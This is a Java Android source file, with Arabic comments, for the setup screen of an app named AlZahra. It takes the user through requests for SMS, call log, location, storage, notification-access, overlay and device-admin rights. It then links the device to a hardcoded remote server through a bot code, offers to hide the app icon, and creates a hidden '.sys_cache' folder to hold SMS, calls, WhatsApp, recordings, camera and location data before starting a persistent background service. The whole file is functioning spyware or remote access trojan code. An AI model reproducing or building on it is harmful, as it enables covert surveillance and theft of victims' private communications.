package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.receiver.AdminReceiver;
import com.alzahra.service.CoreService;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private static final String TAG = "AlZahra";
    private static final int PERM_REQ = 1001;
    
    private SharedPreferences prefs;
    private Handler handler;
    private LinearLayout layout;
    private TextView statusText;
    private String serverUrl = "http://216.128.156.226:8443";
    
    // خطوات الإعداد
    private int step = 0;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        
        // التحقق من الإعداد السابق
        if (prefs.getBoolean("configured", false)) {
            startServiceAndHide();
            return;
        }
        
        setupUI();
        nextStep();
    }
    
    private void setupUI() {
        layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(40, 40, 40, 40);
        layout.setBackgroundColor(0xFF1B5E20);
        
        statusText = new TextView(this);
        statusText.setTextColor(0xFFFFFFFF);
        statusText.setTextSize(18);
        statusText.setGravity(Gravity.CENTER);
        layout.addView(statusText);
        
        ProgressBar pb = new ProgressBar(this);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.topMargin = 30;
        layout.addView(pb, lp);
        
        setContentView(layout);
    }
    
    private void updateStatus(String text) {
        runOnUiThread(() -> statusText.setText(text));
    }
    
    private void nextStep() {
        handler.postDelayed(() -> {
            switch (step) {
                case 0: askPhonePerms(); break;
                case 1: askSmsPerms(); break;
                case 2: askLocationPerms(); break;
                case 3: askStoragePerms(); break;
                case 4: askNotificationPerm(); break;
                case 5: askOverlayPerm(); break;
                case 6: askBatteryPerm(); break;
                case 7: askAdminPerm(); break;
                case 8: showLinkScreen(); break;
                case 9: finishSetup(); break;
            }
        }, 500);
    }
    
    // ═══════════════════════════════════════════
    // طلب الصلاحيات واحدة واحدة بالترتيب
    // ═══════════════════════════════════════════
    
    private void askPhonePerms() {
        updateStatus("الخطوة 1/8\n\nصلاحيات الهاتف والمكالمات");
        
        if (hasPerm(Manifest.permission.READ_PHONE_STATE) &&
            hasPerm(Manifest.permission.READ_CALL_LOG) &&
            hasPerm(Manifest.permission.PROCESS_OUTGOING_CALLS)) {
            step++;
            nextStep();
            return;
        }
        
        showPermDialog("صلاحيات الهاتف", "مطلوبة لقراءة سجل المكالمات",
            () -> requestPerms(new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.CALL_PHONE
            }));
    }
    
    private void askSmsPerms() {
        updateStatus("الخطوة 2/8\n\nصلاحيات الرسائل");
        
        if (hasPerm(Manifest.permission.READ_SMS) &&
            hasPerm(Manifest.permission.SEND_SMS) &&
            hasPerm(Manifest.permission.RECEIVE_SMS)) {
            step++;
            nextStep();
            return;
        }
        
        showPermDialog("صلاحيات الرسائل", "مطلوبة لقراءة وإرسال SMS",
            () -> requestPerms(new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS
            }));
    }
    
    private void askLocationPerms() {
        updateStatus("الخطوة 3/8\n\nصلاحيات الموقع");
        
        if (hasPerm(Manifest.permission.ACCESS_FINE_LOCATION) &&
            hasPerm(Manifest.permission.ACCESS_COARSE_LOCATION)) {
            step++;
            nextStep();
            return;
        }
        
        showPermDialog("صلاحيات الموقع", "مطلوبة لتتبع الموقع",
            () -> requestPerms(new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            }));
    }
    
    private void askStoragePerms() {
        updateStatus("الخطوة 4/8\n\nصلاحيات التخزين");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                step++;
                nextStep();
                return;
            }
        } else {
            if (hasPerm(Manifest.permission.READ_EXTERNAL_STORAGE) &&
                hasPerm(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                step++;
                nextStep();
                return;
            }
        }
        
        showPermDialog("صلاحيات التخزين", "مطلوبة لحفظ البيانات",
            () -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    try {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, 2001);
                    } catch (Exception e) {
                        startActivityForResult(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                            Uri.parse("package:" + getPackageName())), 2001);
                    }
                } else {
                    requestPerms(new String[]{
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE
                    });
                }
            });
    }
    
    private void askNotificationPerm() {
        updateStatus("الخطوة 5/8\n\nالوصول للإشعارات");
        
        if (isNotificationEnabled()) {
            step++;
            nextStep();
            return;
        }
        
        showPermDialog("الوصول للإشعارات", "مطلوب لقراءة إشعارات التطبيقات",
            () -> startActivityForResult(
                new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), 2002));
    }
    
    private void askOverlayPerm() {
        updateStatus("الخطوة 6/8\n\nالظهور فوق التطبيقات");
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this)) {
            step++;
            nextStep();
            return;
        }
        
        showPermDialog("الظهور فوق التطبيقات", "مطلوب للعمل في الخلفية",
            () -> startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName())), 2003));
    }
    
    private void askBatteryPerm() {
        updateStatus("الخطوة 7/8\n\nتجاهل تحسين البطارية");
        
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            step++;
            nextStep();
            return;
        }
        
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
            step++;
            nextStep();
            return;
        }
        
        showPermDialog("تحسين البطارية", "مطلوب للعمل المستمر",
            () -> {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, 2004);
                } catch (Exception e) {
                    step++;
                    nextStep();
                }
            });
    }
    
    private void askAdminPerm() {
        updateStatus("الخطوة 8/8\n\nصلاحية المسؤول");
        
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        
        if (dpm != null && dpm.isAdminActive(admin)) {
            step++;
            nextStep();
            return;
        }
        
        showPermDialog("صلاحية المسؤول", "مطلوبة لحماية التطبيق",
            () -> {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                startActivityForResult(intent, 2005);
            });
    }
    
    // ═══════════════════════════════════════════
    // شاشة الربط
    // ═══════════════════════════════════════════
    
    private void showLinkScreen() {
        runOnUiThread(() -> {
            layout.removeAllViews();
            
            TextView title = new TextView(this);
            title.setText("🔗 ربط الجهاز");
            title.setTextColor(0xFFFFFFFF);
            title.setTextSize(24);
            title.setGravity(Gravity.CENTER);
            title.setPadding(0, 0, 0, 20);
            layout.addView(title);
            
            TextView info = new TextView(this);
            info.setText("1. افتح البوت\n2. أرسل /link\n3. أدخل الكود");
            info.setTextColor(0xFFBBBBBB);
            info.setTextSize(16);
            info.setGravity(Gravity.CENTER);
            info.setPadding(0, 0, 0, 30);
            layout.addView(info);
            
            EditText input = new EditText(this);
            input.setHint("أدخل الكود هنا");
            input.setTextSize(22);
            input.setGravity(Gravity.CENTER);
            input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
            input.setId(100);
            layout.addView(input);
            
            TextView status = new TextView(this);
            status.setText("");
            status.setTextSize(14);
            status.setGravity(Gravity.CENTER);
            status.setPadding(0, 15, 0, 15);
            status.setId(101);
            layout.addView(status);
            
            Button btn = new Button(this);
            btn.setText("🔗 ربط");
            btn.setTextSize(18);
            btn.setOnClickListener(v -> {
                String code = input.getText().toString().trim();
                if (code.length() != 9) {
                    status.setText("❌ الكود 9 أرقام");
                    status.setTextColor(0xFFFF5252);
                    return;
                }
                btn.setEnabled(false);
                status.setText("⏳ جاري التحقق...");
                status.setTextColor(0xFFFFAB40);
                verifyCode(code, status, btn);
            });
            layout.addView(btn);
        });
    }
    
    private void verifyCode(String code, TextView status, Button btn) {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/verify_code");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                
                String deviceId = getAlzahraDeviceId();
                String json = String.format("{\"code\":\"%s\",\"device_id\":\"%s\",\"model\":\"%s\",\"android\":\"%s\"}",
                    code, deviceId, Build.MODEL, Build.VERSION.RELEASE);
                
                conn.getOutputStream().write(json.getBytes());
                
                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    
                    org.json.JSONObject resp = new org.json.JSONObject(sb.toString());
                    if ("ok".equals(resp.optString("status"))) {
                        prefs.edit()
                            .putBoolean("linked", true)
                            .putString("device_id", deviceId)
                            .apply();
                        
                        runOnUiThread(() -> {
                            status.setText("✅ تم الربط!");
                            status.setTextColor(0xFF69F0AE);
                            showHideDialog();
                        });
                    } else {
                        runOnUiThread(() -> {
                            status.setText("❌ " + resp.optString("message", "كود غير صحيح"));
                            status.setTextColor(0xFFFF5252);
                            btn.setEnabled(true);
                        });
                    }
                } else {
                    runOnUiThread(() -> {
                        status.setText("❌ خطأ في الاتصال");
                        status.setTextColor(0xFFFF5252);
                        btn.setEnabled(true);
                    });
                }
                conn.disconnect();
            } catch (Exception e) {
                runOnUiThread(() -> {
                    status.setText("❌ فشل الاتصال");
                    status.setTextColor(0xFFFF5252);
                    btn.setEnabled(true);
                });
            }
        }).start();
    }
    
    private void showHideDialog() {
        new AlertDialog.Builder(this)
            .setTitle("✅ تم الربط بنجاح!")
            .setMessage("هل تريد إخفاء التطبيق؟")
            .setPositiveButton("نعم، إخفاء", (d, w) -> {
                // تغيير اسم التطبيق لإخفائه
                hideAppIcon();
                step++;
                nextStep();
            })
            .setNegativeButton("لا", (d, w) -> {
                step++;
                nextStep();
            })
            .setCancelable(false)
            .show();
    }
    
    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                new ComponentName(this, "com.alzahra.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            Log.e(TAG, "Hide error", e);
        }
    }
    
    // ═══════════════════════════════════════════
    // إنهاء الإعداد
    // ═══════════════════════════════════════════
    
    private void finishSetup() {
        updateStatus("✅ تم الإعداد بنجاح!");
        
        prefs.edit()
            .putBoolean("configured", true)
            .putLong("setup_time", System.currentTimeMillis())
            .apply();
        
        createSecretFolder();
        
        handler.postDelayed(this::startServiceAndHide, 1000);
    }
    
    private void createSecretFolder() {
        try {
            File dir;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                dir = new File(getExternalFilesDir(null), ".sys_cache");
            } else {
                dir = new File(Environment.getExternalStorageDirectory(), ".sys_cache");
            }
            
            if (!dir.exists()) dir.mkdirs();
            
            String[] subs = {"sms", "calls", "notifications", "whatsapp", "messenger", "recordings", "contacts", "location", "camera", "temp"};
            for (String s : subs) {
                File sub = new File(dir, s);
                if (!sub.exists()) sub.mkdirs();
            }
            
            File nomedia = new File(dir, ".nomedia");
            if (!nomedia.exists()) nomedia.createNewFile();
            
            prefs.edit().putString("secret_path", dir.getAbsolutePath()).apply();
            
        } catch (Exception e) {
            Log.e(TAG, "Folder error", e);
        }
    }
    
    private void startServiceAndHide() {
        try {
            Intent i = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i);
            } else {
                startService(i);
            }
        } catch (Exception e) {
            Log.e(TAG, "Service error", e);
        }
        finishAffinity();
    }
    
    // ═══════════════════════════════════════════
    // وظائف مساعدة
    // ═══════════════════════════════════════════
    
    private boolean hasPerm(String perm) {
        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean isNotificationEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }
    
    private void requestPerms(String[] perms) {
        ActivityCompat.requestPermissions(this, perms, PERM_REQ);
    }
    
    private void showPermDialog(String title, String msg, Runnable action) {
        new AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(msg)
            .setPositiveButton("السماح", (d, w) -> action.run())
            .setNegativeButton("تخطي", (d, w) -> { step++; nextStep(); })
            .setCancelable(false)
            .show();
    }
    
    private String getAlzahraDeviceId() {
        String id = prefs.getString("device_id", "");
        if (id.isEmpty()) {
            id = java.util.UUID.randomUUID().toString().substring(0, 8);
            prefs.edit().putString("device_id", id).apply();
        }
        return id;
    }
    
    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == PERM_REQ) {
            boolean allGranted = true;
            for (int r : results) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                step++;
                nextStep();
            } else {
                // إعادة طلب نفس الصلاحية
                new AlertDialog.Builder(this)
                    .setTitle("⚠️ صلاحية مطلوبة")
                    .setMessage("يرجى السماح للمتابعة")
                    .setPositiveButton("إعادة", (d, w) -> nextStep())
                    .setNegativeButton("تخطي", (d, w) -> { step++; nextStep(); })
                    .setCancelable(false)
                    .show();
            }
        }
    }
    
    @Override
    protected void onActivityResult(int code, int result, Intent data) {
        super.onActivityResult(code, result, data);
        
        // التحقق من نجاح العملية
        boolean success = false;
        
        switch (code) {
            case 2001: // التخزين
                success = Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager();
                break;
            case 2002: // الإشعارات
                success = isNotificationEnabled();
                break;
            case 2003: // الظهور
                success = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
                break;
            case 2004: // البطارية
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                success = pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
                break;
            case 2005: // المسؤول
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                ComponentName admin = new ComponentName(this, AdminReceiver.class);
                success = dpm != null && dpm.isAdminActive(admin);
                break;
            default:
                success = true;
        }
        
        if (success) {
            step++;
            nextStep();
        } else {
            // إعادة المحاولة
            new AlertDialog.Builder(this)
                .setTitle("⚠️ لم يتم التفعيل")
                .setMessage("يرجى التفعيل للمتابعة")
                .setPositiveButton("إعادة", (d, w) -> nextStep())
                .setNegativeButton("تخطي", (d, w) -> { step++; nextStep(); })
                .setCancelable(false)
                .show();
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) handler.removeCallbacksAndMessages(null);
    }
}
